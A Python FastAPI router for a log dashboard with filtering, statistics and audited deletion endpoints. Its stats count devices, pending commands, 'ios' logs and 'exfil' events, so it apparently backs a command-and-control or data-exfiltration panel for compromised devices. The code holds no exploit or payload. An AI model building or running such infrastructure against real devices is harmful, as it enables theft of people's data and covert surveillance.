from fastapi import APIRouter, Depends, HTTPException, Query, Request
from pydantic import BaseModel
from sqlalchemy.orm import Session
from sqlalchemy import desc, and_
from datetime import datetime, timedelta
from ..database import get_db, Log, create_audit_log
from ..auth import get_current_user
from ..schemas import LogResponse, StatsResponse
from ..limiter import rate_limit
from typing import Optional, List

router = APIRouter(prefix="/api/logs", tags=["logs"], redirect_slashes=False)


class BatchDeleteRequest(BaseModel):
    ids: List[int]


@router.get("", response_model=List[LogResponse])
async def get_logs(
    skip: int = 0,
    limit: int = 100,
    ip: Optional[str] = None,
    path: Optional[str] = None,
    log_type: Optional[str] = None,
    device_uuid: Optional[str] = None,
    start_time: Optional[datetime] = None,
    end_time: Optional[datetime] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(Log).order_by(desc(Log.timestamp))
    
    if ip:
        query = query.filter(Log.ip.contains(ip))
    if path:
        query = query.filter(Log.path.contains(path))
    if log_type:
        query = query.filter(Log.log_type == log_type)
    if device_uuid:
        query = query.filter(Log.device_uuid == device_uuid)
    if start_time:
        query = query.filter(Log.timestamp >= start_time)
    if end_time:
        query = query.filter(Log.timestamp <= end_time)
    
    logs = query.offset(skip).limit(limit).all()
    return logs


@router.get("/stats", response_model=StatsResponse)
async def get_log_stats(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    from ..database import Device, Command
    total_requests = db.query(Log).count()
    total_devices = db.query(Device).count()
    active_devices = db.query(Device).filter(Device.status == "active").count()
    ios_logs = db.query(Log).filter(Log.log_type == "ios").count()
    pending_commands = db.query(Command).filter(Command.status == "pending").count()
    total_exfil = db.query(Log).filter(Log.log_type == "exfil").count()
    
    today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    today_requests = db.query(Log).filter(Log.timestamp >= today_start).count()
    today_exfil = db.query(Log).filter(and_(Log.log_type == "exfil", Log.timestamp >= today_start)).count()
    
    request_trend = []
    exfil_trend = []
    for i in range(7):
        date = today_start - timedelta(days=i)
        next_date = date + timedelta(days=1)
        count = db.query(Log).filter(and_(Log.timestamp >= date, Log.timestamp < next_date)).count()
        request_trend.insert(0, count)
        exfil_count = db.query(Log).filter(and_(
            Log.log_type == "exfil",
            Log.timestamp >= date,
            Log.timestamp < next_date
        )).count()
        exfil_trend.insert(0, exfil_count)
    
    return {
        "total_requests": total_requests,
        "total_devices": total_devices,
        "active_devices": active_devices,
        "total_exfil": total_exfil,
        "ios_logs": ios_logs,
        "pending_commands": pending_commands,
        "today_requests": today_requests,
        "today_exfil": today_exfil,
        "request_trend": request_trend,
        "exfil_trend": exfil_trend
    }


@rate_limit("10/minute")
@router.delete("/batch")
async def batch_delete_logs(
    request: Request,
    delete_request: BatchDeleteRequest,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    if not delete_request.ids:
        raise HTTPException(status_code=400, detail="No log IDs provided")
    deleted = db.query(Log).filter(Log.id.in_(delete_request.ids)).delete(synchronize_session=False)
    db.commit()

    username = current_user.username if current_user else "anonymous"
    create_audit_log(
        db, username=username, action="log_batch_delete", resource_type="log",
        detail=f"Batch deleted {deleted} logs, IDs: {delete_request.ids[:10]}{'...' if len(delete_request.ids) > 10 else ''}",
        ip_address=request.client.host if request.client else None
    )
    return {"message": f"Deleted {deleted} logs"}


@rate_limit("5/minute")
@router.delete("/clear")
async def clear_logs(
    request: Request,
    log_type: Optional[str] = None,
    device_uuid: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(Log)
    filters = []
    if log_type:
        query = query.filter(Log.log_type == log_type)
        filters.append(f"type={log_type}")
    if device_uuid:
        query = query.filter(Log.device_uuid == device_uuid)
        filters.append(f"device={device_uuid}")
    deleted = query.delete(synchronize_session=False)
    db.commit()

    username = current_user.username if current_user else "anonymous"
    create_audit_log(
        db, username=username, action="log_clear", resource_type="log",
        detail=f"Cleared {deleted} logs{' (' + ', '.join(filters) + ')' if filters else ''}",
        ip_address=request.client.host if request.client else None
    )
    return {"message": f"Cleared {deleted} logs"}


@router.delete("/{log_id}")
async def delete_log(
    request: Request,
    log_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    log = db.query(Log).filter(Log.id == log_id).first()
    if not log:
        raise HTTPException(status_code=404, detail="Log not found")
    db.delete(log)
    db.commit()

    username = current_user.username if current_user else "anonymous"
    create_audit_log(
        db, username=username, action="log_delete", resource_type="log",
        resource_id=log_id, detail=f"Deleted log {log_id} (type={log.log_type}, path={log.path})",
        ip_address=request.client.host if request.client else None
    )
    return {"message": "Log deleted"}
